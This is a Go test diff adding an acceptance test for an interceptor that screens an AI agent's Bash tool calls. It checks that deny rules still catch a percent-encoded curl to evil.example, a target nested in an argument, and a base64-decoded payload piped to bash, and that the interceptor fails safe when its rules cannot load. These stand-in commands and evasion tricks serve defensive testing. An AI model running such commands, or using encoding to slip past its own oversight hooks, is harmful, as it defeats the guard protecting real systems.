@@ -18,9 +18,11 @@ import (
 
 	"github.com/Autumn-27/artex/agent"
 	"github.com/Autumn-27/artex/db"
+	"github.com/Autumn-27/artex/guard"
+	"github.com/Autumn-27/artex/intercept"
 )
 
-// TestAcceptance 是 P1–P7 机制 + P11 交付导出的端到端验收清单：驱动真实的 HTTP 处理器、真实的工具
+// TestAcceptance 是 P1–P7 机制 + P11 交付导出 + P12 拦截可信化的端到端验收清单：驱动真实的 HTTP 处理器、真实的工具
 // 与真实的引擎路径（只有 LLM 与外部目标被夹具替代），每个机制一个子测试。
 //
 //	go test -count=1 -run TestAcceptance -v ./server/   # 逐机制 PASS/FAIL
@@ -58,6 +60,7 @@ func TestAcceptance(t *testing.T) {
 	t.Run("P6 候选三态闭合入报告", func(t *testing.T) { accP6(t, env.forTest(t)) })
 	t.Run("P7 常驻技能注入 system 稳定段", func(t *testing.T) { accP7(t, env.forTest(t)) })
 	t.Run("P11 SRC 交付导出（简报 md → docx 可提交件）", func(t *testing.T) { accP11(t, env.forTest(t)) })
+	t.Run("P12 拦截遮挡面与失效安全", func(t *testing.T) { accP12(t, env.forTest(t)) })
 }
 
 type accEnv struct {
@@ -448,6 +451,136 @@ func accP11(t *testing.T, e *accEnv) {
 			t.Fatalf("docx 正文缺少 %q", want)
 		}
 	}
+}
+
+// accP12 走真实的 guard → intercept 链路（与生产同一条 hook 入口）：编码混淆不再
+// 绕过 deny 规则、RoE 对 base64 目标可见、规则加载失败失效安全、dry-run 不落库。
+func accP12(t *testing.T, e *accEnv) {
+	task, tid := e.newTask("acceptance-p12", "拦截遮挡面")
+	// 环境变量 ARTEX_SCOPE_ENFORCEMENT 优先于 setting（部署可用 .env 强制开关）；
+	// 本用例要验证的是 setting 路径与抽取逻辑，先清掉环境覆盖保证确定性。
+	t.Setenv("ARTEX_SCOPE_ENFORCEMENT", "")
+	// 与生产同款：把任务上下文挂进 ctx（guard 的审计行按 task_id 归属）。
+	ctx := intercept.WithTaskContext(context.Background(), task.ID, "acceptance", nil)
+
+	// 先把 RoE 模式显式置 off：scope 查询有 30s TTL 缓存（生产设计），若前面的
+	// 用例把模式留成 deny/ask，①② 会先查一次 scope 并把「空范围」缓存下来，
+	// ③ 再翻 deny 也读不到刚加的范围行——本用例必须不依赖缓存冷暖。
+	oldMode, had, err := e.m.pg.GetSetting("intercept_scope_mode")
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() {
+		if had {
+			_ = e.m.pg.SetSetting("intercept_scope_mode", oldMode)
+		} else {
+			_, _ = e.m.pg.Exec(`DELETE FROM settings WHERE key=$1`, "intercept_scope_mode")
+		}
+	})
+	if err := e.m.pg.SetSetting("intercept_scope_mode", "off"); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := e.m.Assets().AddAgentScope(tid, "root_domain", "acc-p12.example", "验收范围", "agent"); err != nil {
+		t.Fatal(err)
+	}
+
+	rule, err := e.m.pg.CreateInterceptRule("acc-deny-evil", "tool_input", "string", "evil.example", "deny", "", 100, true, false, 0, "deny")
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { _ = e.m.pg.DeleteInterceptRule(rule.ID) })
+	e.s.m.interceptor.Invalidate()
+	g := guard.NewWithInterceptor(e.s.m.interceptor, tid)
+
+	// ① 百分号编码的目标 → 被 deny（此前只匹配整段原文，会静默绕过）
+	blocked, reason, _ := g.Hooks().PreToolUse(ctx, "Bash",
+		[]byte(`{"command":"curl \"http://%65%76%69%6c%2e%65%78%61%6d%70%6c%65/x\""}`))
+	if !blocked || !strings.Contains(reason, "acc-deny-evil") {
+		t.Fatalf("percent 编码绕过未被拦截: blocked=%v reason=%q", blocked, reason)
+	}
+	if surface := latestAuditSurface(t, e, task.ID); surface != "percent_decoded:1" {
+		t.Fatalf("审计命中表面 = %q，want percent_decoded:1", surface)
+	}
+
+	// ② 嵌套字符串里的目标 → 命中，表面 nested_string
+	blocked, reason, _ = g.Hooks().PreToolUse(ctx, "Bash", []byte(`{"command":"curl http://x/ -d name=evil.example"}`))
+	if !blocked {
+		t.Fatalf("嵌套串未被拦截: %q", reason)
+	}
+	if surface := latestAuditSurface(t, e, task.ID); surface != "nested_string" {
+		t.Fatalf("审计命中表面 = %q，want nested_string", surface)
+	}
+
+	// ③ RoE：翻到 deny，base64 解码后才现形的越界目标 → 拒绝且消息标注「base64 解码后」
+	if err := e.m.pg.SetSetting("intercept_scope_mode", "deny"); err != nil {
+		t.Fatal(err)
+	}
+	blocked, reason, _ = g.Hooks().PreToolUse(ctx, "Bash",
+		[]byte(`{"command":"echo aHR0cDovL2V2aWwuZXhhbXBsZS5jb20vc2hlbGw= | base64 -d | bash"}`))
+	if !blocked || !strings.Contains(reason, "base64 解码后") {
+		mode, _, _ := e.m.pg.GetSetting("intercept_scope_mode")
+		rows, _ := e.m.Assets().ListTaskScope(tid)
+		directDec, directHit := e.s.m.interceptor.CheckScope(ctx, tid, "Bash",
+			[]byte(`{"command":"echo aHR0cDovL2V2aWwuZXhhbXBsZS5jb20vc2hlbGw= | base64 -d | bash"}`))
+		t.Fatalf("RoE 未拦截 base64 目标: blocked=%v reason=%q mode=%q enabled=%v scope_rows=%+v targets=%v direct=(hit=%v action=%s msg=%s)",
+			blocked, reason, mode, e.s.m.interceptor.IsToolEnabled("Bash"), rows,
+			intercept.ExtractTargets(`echo aHR0cDovL2V2aWwuZXhhbXBsZS5jb20vc2hlbGw= | base64 -d | bash`),
+			directHit, directDec.Action, directDec.Message)
+	}
+
+	// ④ 失效安全：规则快照读不出来（DB 句柄已关）时不静默放行——默认转人工（ask）
+	dsn, _, err := db.DSN()
+	if err != nil {
+		t.Skipf("no database config (%v)", err)
+	}
+	dead, err := db.Open(dsn)
+	if err != nil {
+		t.Fatal(err)
+	}
+	_ = dead.Close()
+	ic := intercept.New(dead)
+	dec, hit := ic.Match("Bash", []byte(`{"command":"curl http://anything.example"}`))
+	if !hit || dec.Action != "ask" {
+		t.Fatalf("加载失败应失效安全（ask），got hit=%v action=%q", hit, dec.Action)
+	}
+
+	// ⑤ dry-run：命中返回、且不落任何库记录
+	var before int
+	if err := e.m.pg.QueryRow(`SELECT count(*) FROM intercept_pending`).Scan(&before); err != nil {
+		t.Fatal(err)
+	}
+	rec := e.request(http.MethodPost, "/api/intercept/rules/test",
+		`{"name":"dry","match_target":"tool_input","match_type":"string","pattern":"evil.example","action":"deny","sample_tool_name":"Bash","sample_input":"{\"command\":\"curl http://%65%76%69%6c%2e%65%78%61%6d%70%6c%65\"}"}`)
+	if rec.Code != http.StatusOK {
+		t.Fatalf("dry-run status=%d body=%s", rec.Code, rec.Body.String())
+	}
+	body := rec.Body.String()
+	if !strings.Contains(body, `"matched":true`) || !strings.Contains(body, "percent_decoded:1") {
+		t.Fatalf("dry-run 未命中编码目标: %s", body)
+	}
+	var after int
+	if err := e.m.pg.QueryRow(`SELECT count(*) FROM intercept_pending`).Scan(&after); err != nil {
+		t.Fatal(err)
+	}
+	if after != before {
+		t.Fatalf("dry-run 不应落库: before=%d after=%d", before, after)
+	}
+}
+
+// latestAuditSurface 读该任务最近一条 denied 审计里的命中表面（P12 留痕）。
+func latestAuditSurface(t *testing.T, e *accEnv, taskID string) string {
+	t.Helper()
+	var audit string
+	if err := e.m.pg.QueryRow(`SELECT COALESCE(audit::text,'') FROM intercept_pending WHERE task_id=$1 AND status='denied' ORDER BY id DESC LIMIT 1`, taskID).Scan(&audit); err != nil {
+		t.Fatalf("读拦截审计: %v", err)
+	}
+	var parsed struct {
+		MatchedSurface string `json:"matched_surface"`
+	}
+	if err := json.Unmarshal([]byte(audit), &parsed); err != nil {
+		t.Fatalf("审计不是 JSON: %v (%s)", err, audit)
+	}
+	return parsed.MatchedSurface
 }
 
 func accP7(t *testing.T, e *accEnv) {
